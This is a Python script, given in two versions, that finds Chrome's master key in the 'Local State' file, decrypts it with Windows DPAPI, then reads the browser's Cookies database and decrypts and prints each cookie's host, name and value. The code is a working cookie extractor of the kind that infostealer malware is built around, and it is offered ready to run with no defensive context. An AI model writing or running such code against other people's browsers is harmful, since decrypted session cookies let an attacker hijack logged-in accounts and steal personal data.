"""
import sqlite3
import json
from base64 import b64decode
from win32.win32crypt import CryptUnprotectData
from Cryptodome.Cipher.AES import new, MODE_GCM
from Crypto.Cipher import AES
from glob import glob
import os

def get_chrome_cookies_master_key(data):
    os_crypt = data['os_crypt']
    encrypted_key = os_crypt['encrypted_key']
    decode_enc_key = b64decode(encrypted_key)
    # remove leading string -> b'DPAPI'
    protected_data = decode_enc_key[5:]
    # CryptUnprotectData function decrypts and does an integrity check of the data 
    # in a DATA_BLOB structure. Usually, the only user who can decrypt the data is 
    # a user with the same logon credentials as the user who encrypted the data.
    unprotect_data = CryptUnprotectData(protected_data)
    # 2nd string is the key
    key = unprotect_data[1]
    return key

def get_chrome_cookies(db=None):
    if db is None:
        # Return the argument with environment variables expanded
        db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Network/Cookies')
        f_obj = open(db+'/../../../Local State', 'rb')
        data = f_obj.read()
        f_obj.close()
        data = data.decode('utf-8')
        # Deserialize s (a str, bytes or bytearray instance containing a JSON document) 
        # to a Python object using this conversion table.
        data = json.loads(data)
        key = get_chrome_cookies_master_key(data)

        connection = sqlite3.connect(db)

        # create user-defined SQL function
        # create_function(name_of_new_func, no_of_args, callback_func)
        def decrypt(v):
            try:
                iv = v[3:15]
                payload = v[15:]
                cipher = new(key, AES.MODE_GCM, iv)
                value = cipher.decrypt(payload)[:-16]
                return value
            except:
                pass

        #connection.create_function('decrypt',1,decrypt)
        #result = connection.execute("SELECT * from sqlite_master where type='table'")
        cursor = connection.cursor()
        c = 0

        result_data = {}
        for row in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies;"):
            host_key = row[0]
            data = {
                'name' : row[1],
                'decrypted_value': decrypt(row[2])
            }
            if host_key not in result_data:
                result_data[host_key] = []
            result_data[host_key].append(data)
        
        #print(len(result_data))
        res_table = [["Host","Name","Decrypted Value"]]
        result_data = result_data
        c = 0
        for host, cookies in result_data.items():
            #print("-"*60)
            #print(f"Host: {host}")
            for cookie in cookies:
                #print()
                #print(cookies['name'])
                res_table.append([host, cookie['name'], cookie["decrypted_value"]])
                '''
                for key, val in cookies.items():
                    title = key.title().replace('_',' ')
                    try:
                        #print(f"{title}:{val}")
                        res_table.append([host, title, val])
                    except:
                        pass
                '''
                #print()
        connection.close()
        for line in res_table:
            try:
                print(line)
            except:
                continue


get_chrome_cookies()
"""

import os
import json
import base64
import sqlite3
from shutil import copyfile
from win32.win32crypt import CryptUnprotectData

# python.exe -m pip install pypiwin32
import win32crypt
# python.exe -m pip install pycryptodomex
from Cryptodome.Cipher import AES


def get_chrome_cookies_master_key(data):
    os_crypt = data['os_crypt']
    encrypted_key = os_crypt['encrypted_key']
    decode_enc_key = base64.b64decode(encrypted_key)
    # remove leading string -> b'DPAPI'
    protected_data = decode_enc_key[5:]
    # CryptUnprotectData function decrypts and does an integrity check of the data 
    # in a DATA_BLOB structure. Usually, the only user who can decrypt the data is 
    # a user with the same logon credentials as the user who encrypted the data.
    unprotect_data = CryptUnprotectData(protected_data)
    # 2nd string is the key
    key = unprotect_data[1]
    return key


db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Network/Cookies')
f_obj = open(db+'/../../../Local State', 'rb')
data = f_obj.read()
f_obj.close()
data = data.decode('utf-8')
# Deserialize s (a str, bytes or bytearray instance containing a JSON document) 
# to a Python object using this conversion table.
data = json.loads(data)
key = get_chrome_cookies_master_key(data)

# Connect to the Database
conn = sqlite3.connect(db)
cursor = conn.cursor()
conn.text_factory = bytearray

# Get the results
cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
arr = []
for host_key, name, value, encrypted_value in cursor.fetchall():

    # Decrypt the encrypted_value
    try:
        # Try to decrypt as AES (2020 method)
        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
        decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
    except:
        # If failed try with the old method
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0

    print(host_key, decrypted_value)
conn.commit()
conn.close()